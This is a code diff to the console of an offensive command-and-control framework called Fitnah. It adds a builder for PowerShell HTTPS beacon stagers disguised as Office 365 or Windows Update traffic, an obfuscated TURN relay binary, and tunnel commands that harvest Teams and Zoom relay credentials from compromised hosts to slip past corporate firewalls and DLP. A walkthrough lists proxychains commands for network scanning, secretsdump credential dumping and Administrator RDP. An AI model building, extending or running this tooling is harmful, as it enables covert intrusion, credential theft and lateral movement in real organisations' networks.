@@ -532,11 +532,21 @@ class FitnahConsole:
         session = self._kernel.sessions.get(agent_id) if self._kernel else None
         chat_id = session.group_id if (session and session.group_id) else agent_id
 
+        # HTTPS stager: bypass the BuildEngine entirely
+        if fmt_str.lower() == "https":
+            self._build_https_stager(agent_id, args)
+            return
+
+        # turnt-relay binary build
+        if fmt_str.lower() in ("turnt-relay", "turnt_relay", "turnt"):
+            self._build_turnt_relay(args)
+            return
+
         # parse enums
         try:
             fmt = OutputFormat(fmt_str.lower())
         except ValueError:
-            _err(f"Unknown format: {fmt_str!r}. Choose: exe dll shellcode ps1 vba hta")
+            _err(f"Unknown format: {fmt_str!r}. Choose: exe dll shellcode ps1 vba hta https")
             return
 
         try:
@@ -579,6 +589,137 @@ class FitnahConsole:
             _err(f"Build failed: {result.error}")
             for line in result.build_log[-10:]:
                 print(f"       {line}")
+
+    def _build_turnt_relay(self, args: list[str]) -> None:
+        """
+        builder -f turnt-relay [--arch amd64|386|arm64] [--os windows|linux|darwin]
+                               [--go-build] [--go-bin /usr/local/go/bin/go]
+                               [--garble] [--list]
+        """
+        from fitnah.builder.turnt import TurntBuilder, TurntBuildRequest
+
+        def _val(flag: str, default: str = "") -> str:
+            if flag in args:
+                i = args.index(flag)
+                return args[i + 1] if i + 1 < len(args) else default
+            return default
+
+        if "--list" in args:
+            tb = TurntBuilder()
+            cached = tb.list_cached()
+            if not cached:
+                _info("No turnt binaries built yet.")
+            else:
+                print(f"\n  {'NAME':<45} {'SIZE':>10}  SHA256")
+                print(f"  {'─'*45} {'─'*10}  {'─'*18}")
+                for entry in cached:
+                    print(f"  {entry['name']:<45} {entry['size']:>10,}  {entry['sha256']}")
+                print()
+            return
+
+        arch       = _val("--arch",    "amd64")
+        os_target  = _val("--os",      "windows")
+        go_bin     = _val("--go-bin",  "go")
+        go_build   = "--go-build" in args
+        garble     = "--garble"   in args
+        out_dir    = _val("--out-dir", "build/turnt")
+
+        req = TurntBuildRequest(
+            arch=arch, os_target=os_target,
+            go_build=go_build, go_bin=go_bin,
+            garble=garble, output_dir=out_dir,
+        )
+
+        _info(f"Building turnt-relay for {os_target}/{arch} ({'compile' if go_build else 'download'})...")
+        tb     = TurntBuilder(out_dir)
+        result = tb.build(req)
+
+        if result.ok:
+            _ok(f"turnt-relay ready → {result.path}  ({result.size:,} bytes  sha256:{result.sha256[:16]}...)  [{result.source}]")
+            _info("Upload with: upload <agent_id> " + str(result.path))
+            _info("Or use: use turnt_relay  →  set relay_bin_path " + str(result.path))
+        else:
+            _err(f"turnt-relay build failed: {result.error}")
+
+    def _build_https_stager(self, agent_id: str, args: list[str]) -> None:
+        """
+        builder -f https -a <agent_id> [--url https://c2.example.com] [--profile office365]
+                                        [--sleep N] [--jitter N] [--kill-date YYYY-MM-DD]
+                                        [--encoded] [--out filename]
+        """
+        from fitnah.builder.stagers.https_ps1 import HttpsPs1Stager, HttpsStagerConfig
+        from fitnah.c2.profiles import ProfileManager
+        import os
+
+        def _val(flag: str, default: str = "") -> str:
+            if flag in args:
+                i = args.index(flag)
+                return args[i + 1] if i + 1 < len(args) else default
+            return default
+
+        c2_url      = _val("--url",        "")
+        prof_name   = _val("--profile",    "")
+        sleep_ms    = int(_val("--sleep",  "5000"))
+        jitter      = float(_val("--jitter", "0.20"))
+        kill_date   = _val("--kill-date",  "")
+        out_name    = _val("--out",        "")
+        encoded     = "--encoded" in args
+
+        if not c2_url:
+            # try HTTP listener config
+            try:
+                cfg = self._kernel.cfg
+                host = cfg.get("http", "host", default="0.0.0.0")
+                port = cfg.get("http", "port", default="443")
+                tls  = cfg.get("http", "tls",  default=True)
+                scheme = "https" if tls else "http"
+                c2_url = f"{scheme}://{host}:{port}"
+            except Exception:
+                pass
+        if not c2_url:
+            _err("Provide --url https://c2.example.com or configure http.host/port in framework.yaml")
+            return
+
+        auth_key = ""
+        try:
+            auth_key = self._kernel.cfg.get("http", "auth_key", default="")
+        except Exception:
+            pass
+        if not auth_key:
+            import secrets
+            auth_key = secrets.token_hex(16)
+            _info(f"No http.auth_key in config; using ephemeral key: {auth_key}")
+
+        profile = ProfileManager().get(prof_name) if prof_name else None
+
+        cfg_obj = HttpsStagerConfig(
+            c2_url    = c2_url,
+            agent_id  = agent_id,
+            auth_key  = auth_key,
+            sleep_ms  = sleep_ms,
+            jitter    = jitter,
+            kill_date = kill_date,
+            profile   = profile,
+        )
+
+        if encoded:
+            output = HttpsPs1Stager.generate_encoded(cfg_obj)
+        else:
+            output = HttpsPs1Stager.generate(cfg_obj)
+
+        if not out_name:
+            out_name = f"https_beacon_{agent_id[:8]}.{'txt' if encoded else 'ps1'}"
+
+        out_dir = Path(self._kernel.cfg.get("builder", "output_dir", default="build") if self._kernel else "build")
+        out_dir.mkdir(parents=True, exist_ok=True)
+        out_path = out_dir / out_name
+        out_path.write_text(output, encoding="utf-8")
+        _ok(f"HTTPS stager written → {out_path}  ({len(output):,} bytes)")
+        _info(f"C2 URL:   {c2_url}")
+        _info(f"Agent ID: {agent_id}")
+        _info(f"Profile:  {prof_name or 'default'}")
+        if encoded:
+            _info(f"One-liner: {output[:80]}...")
 
     def _builder_list(self) -> None:
         """List files in the build output directory."""
@@ -960,6 +1101,126 @@ class FitnahConsole:
         else:
             _err(f"Unknown sub-command: {sub}. Use: list | set <name> | info [name]")
 
+    # ── tunnel (turnt TURN-tunnel management) ────────────────────────────────
+
+    def _do_tunnel(self, args: list[str]) -> None:
+        """
+        tunnel setup                — full TURN tunnel walkthrough
+        tunnel creds [agent_id]     — run turnt_credentials on agent
+        tunnel start <offer_b64>    — deploy relay with offer, print SDP answer
+        tunnel status               — relay status on active agent
+        tunnel stop                 — stop relay on active agent
+        tunnel clean                — stop + remove binary
+        tunnel build [--os ..] [--arch ..]  — build/download turnt-relay binary
+        """
+        sub = args[0] if args else "setup"
+
+        if sub == "setup":
+            print(_TURNT_SETUP_HELP)
+            return
+
+        if sub == "build":
+            self._build_turnt_relay(args[1:])
+            return
+
+        if sub == "offer":
+            offer = self._kernel.router.turnt_pending_offer if self._kernel else ""
+            if offer:
+                _ok(f"Pending SDP offer ({len(offer)} chars) — send to agent then run: tunnel start <answer>")
+                print(f"\n{offer}\n")
+            else:
+                _info("No pending offer. Run: tunnel pivot  or  builder -f turnt-relay then tunnel creds")
+            return
+
+        if sub == "pivot":
+            _info("Launching full turnt C2 pivot on active agent...")
+            if not agent_id:
+                _err("No session selected.")
+                return
+            session_tmp = self._kernel.sessions.get(agent_id) if agent_id else None
+            if not session_tmp:
+                _err(f"Session not found: {agent_id}")
+                return
+            result = self._run_async(
+                self._kernel.execute(agent_id, "turnt_pivot_c2", {"action": "full"})
+            )
+            if result and not result.error:
+                print(result.data or "(no output)")
+            else:
+                _err(result.error if result else "no response")
+            return
+
+        agent_id = self._active_agent
+        if sub == "creds" and len(args) > 1:
+            agent_id = args[1]
+
+        if not agent_id:
+            _err("No session selected. Use: sessions -i <id>  or  tunnel creds <agent_id>")
+            return
+
+        session = self._kernel.sessions.get(agent_id)
+        if not session:
+            _err(f"Session not found: {agent_id}")
+            return
+
+        if sub == "creds":
+            _info(f"Harvesting TURN credentials from {session.hostname}...")
+            result = self._run_async(
+                self._kernel.execute(agent_id, "turnt_credentials", {"refresh": "true"})
+            )
+            if result and not result.error:
+                print(result.data or "(no output)")
+            else:
+                _err(result.error if result else "no response")
+
+        elif sub == "start":
+            if len(args) < 2:
+                _err("Usage: tunnel start <base64_SDP_offer>")
+                return
+            offer = args[1]
+            _info(f"Starting turnt-relay on {session.hostname}...")
+            result = self._run_async(
+                self._kernel.execute(agent_id, "turnt_relay",
+                                     {"action": "start", "offer": offer})
+            )
+            if result and not result.error:
+                output = result.data or ""
+                print(output)
+                # Extract answer and feed directly to router if available
+                answer = ""
+                for line in output.splitlines():
+                    if line.startswith("ANSWER:"):
+                        answer = line[7:].strip()
+                        break
+                    if len(line) >= 200 and "=" in line:
+                        answer = line.strip()
+                        break
+                if answer:
+                    print(f"\n  SDP answer ({len(answer)} chars) — submitting to turnt transport...")
+                    ok = self._kernel.router.submit_turnt_answer(answer)
+                    if ok:
+                        _ok("TURN tunnel established via router.")
+                    else:
+                        _info("Paste answer manually into turnt-control if running separately:")
+                        print(f"  {answer[:80]}...")
+                else:
+                    _err("No SDP answer found in relay output")
+            else:
+                _err(result.error if result else "no response")
+
+        elif sub in ("status", "stop", "clean"):
+            _info(f"Relay {sub} on {session.hostname}...")
+            result = self._run_async(
+                self._kernel.execute(agent_id, "turnt_relay", {"action": sub})
+            )
+            if result and not result.error:
+                print(result.data or "(no output)")
+            else:
+                _err(result.error if result else "no response")
+
+        else:
+            _err(f"Unknown tunnel sub-command: {sub}")
+
     # ── audit verify ──────────────────────────────────────────────────────
 
     def _do_audit_verify(self, args: list[str]) -> None:
@@ -1015,6 +1276,7 @@ _COMMANDS: dict[str, callable] = {
     "schedules":    FitnahConsole._do_schedules,
     "profile":      FitnahConsole._do_profile,
     "audit-verify": FitnahConsole._do_audit_verify,
+    "tunnel":       FitnahConsole._do_tunnel,
     "help":         FitnahConsole._do_help,
     "exit":         FitnahConsole._do_exit,
     "quit":         FitnahConsole._do_exit,
@@ -1069,13 +1331,19 @@ _HELP_TEXT = """
 
   BUILDER
   ────────────────────────────────────────────────────────────
-  builder -f ps1 -a <id>               Build PS1 stager
+  builder -f ps1 -a <id>               Build PS1 stager (Telegram transport)
+  builder -f https -a <id>             Build PS1 HTTPS beacon (custom C2 transport)
   builder -f exe -a <id> --arch x64    Build EXE (requires mingw-w64)
   builder -f vba -a <id>               Build VBA macro stager
   builder -f hta -a <id>               Build HTA stager
   builder -f shellcode -a <id>         Build raw shellcode (requires donut)
   builder --list                       List builds in output directory
   Options: --arch x64|x86  --sleep N  --jitter N  --encrypt none|xor|aes-256-gcm  --out name
+  HTTPS Options: --url https://c2.host  --profile office365|jquery|windows_update|google_fonts
+                 --kill-date YYYY-MM-DD  --encoded (base64 one-liner)
+  builder -f turnt-relay               Build turnt-relay TURN tunnel binary
+    --os windows|linux|darwin  --arch amd64|386|arm64
+    --go-build  (compile from source instead of download)  --garble (obfuscate)
 
   SCHEDULER
   ────────────────────────────────────────────────────────────
@@ -1124,10 +1392,88 @@ _HELP_TEXT = """
     set action stop           Stop the server
     run
 
+  TURN TUNNEL (turnt)
+  ────────────────────────────────────────────────────────────
+  tunnel setup                Full walkthrough: harvest creds → build relay → establish tunnel
+  tunnel creds [agent_id]     Extract Teams/Zoom TURN relay credentials from agent
+  tunnel build                Download/compile turnt-relay binary for agent deployment
+    --os windows|linux  --arch amd64  --go-build  --garble
+  tunnel start <offer_b64>    Deploy relay on active agent, return SDP answer
+  tunnel status               Check relay status on active agent
+  tunnel stop                 Stop relay process on active agent
+  tunnel clean                Stop + remove relay binary from agent
+
   GENERAL
   ────────────────────────────────────────────────────────────
   help                        Show this help text
   exit / quit                 Exit the framework
+"""
+
+_TURNT_SETUP_HELP = """
+  ╔══════════════════════════════════════════════════════════════════════╗
+  ║  TURN Tunnel Setup (turnt — via *.relay.teams.microsoft.com)         ║
+  ╚══════════════════════════════════════════════════════════════════════╝
+
+  OVERVIEW
+  ─────────────────────────────────────────────────────────────────────
+  Traffic route:  Operator ←→ TURN server (Teams/Zoom infra, port 443)
+                                  ↕  WebRTC DTLS data channel
+                             Agent (turnt-relay)
+
+  The TURN server is a Microsoft-operated relay endpoint whitelisted
+  by virtually every corporate firewall and DLP appliance.  All traffic
+  appears as legitimate Teams meeting/relay traffic.
+
+  STEP 1 — Build or download turnt-relay
+  ─────────────────────────────────────────────────────────────────────
+    fitnah> tunnel build --os windows --arch amd64
+    # → build/turnt/turnt-relay_windows_amd64.exe
+
+  STEP 2 — Harvest TURN credentials from agent
+  ─────────────────────────────────────────────────────────────────────
+    fitnah> sessions -i <agent_id>
+    fitnah> tunnel creds
+    # Returns Teams relay username/password → saved to loot
+
+    OR manually on operator machine (if Teams is installed):
+    operator$ turnt-credentials msteams -o creds.yaml
+
+  STEP 3 — Start turnt-controller on operator machine
+  ─────────────────────────────────────────────────────────────────────
+    operator$ turnt-controller -config creds.yaml
+    # Prints a base64 SDP offer, e.g.:
+    # Offer: eyJzZHAiOiJ2PTAv...
+
+  STEP 4 — Deploy relay + exchange SDP offer/answer
+  ─────────────────────────────────────────────────────────────────────
+    fitnah> use turnt_relay
+    fitnah> set relay_bin_path build/turnt/turnt-relay_windows_amd64.exe
+    fitnah> set action start
+    fitnah> set offer eyJzZHAiOiJ2PTAv...
+    fitnah> run
+    # Returns answer base64 string
+
+    OR shortcut:
+    fitnah> tunnel start eyJzZHAiOiJ2PTAv...
+    # Fitnah prints the answer highlighted — paste into turnt-controller
+
+  STEP 5 — Paste answer into turnt-controller
+  ─────────────────────────────────────────────────────────────────────
+    turnt-controller> <paste answer>
+    # Tunnel established! turnt-controller is now a SOCKS5 proxy on
+    # 127.0.0.1:1080 (default)
+
+  STEP 6 — Use the SOCKS5 proxy
+  ─────────────────────────────────────────────────────────────────────
+    proxychains4 nmap -sT -p 445,3389,5985 10.10.0.0/24
+    proxychains4 crackmapexec smb 10.10.0.0/24
+    proxychains4 impacket-secretsdump domain/user:pass@10.10.0.1
+    proxychains4 xfreerdp /v:10.10.0.50 /u:Administrator
+
+  CLEANUP
+  ─────────────────────────────────────────────────────────────────────
+    fitnah> tunnel stop      # stop relay process
+    fitnah> tunnel clean     # stop + delete binary from agent
 """
 
 
